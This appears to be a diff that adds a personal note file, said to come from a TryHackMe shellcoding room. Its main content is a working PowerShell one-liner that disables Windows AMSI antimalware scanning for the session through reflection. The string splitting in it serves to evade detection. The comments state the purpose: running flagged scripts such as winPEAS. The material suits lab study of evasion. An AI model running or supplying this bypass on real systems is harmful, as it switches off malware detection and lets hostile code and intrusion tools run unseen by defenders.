@@ -1,0 +1,5 @@
+// this script will disable AMSI(the thing that flags ps pasted scripts like winpeas as mal.. for the current session only)
+// after running this you can actullay run anything on the current powershell interactive session
+// from tryhackme.com shellcoding room
+PS M:\\> $Value="SetValue"
+PS M:\\> [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils').GetField('amsi'+'Init'+'Failed','No'+'nPublic,S'+'tatic').$Value($null,$true)
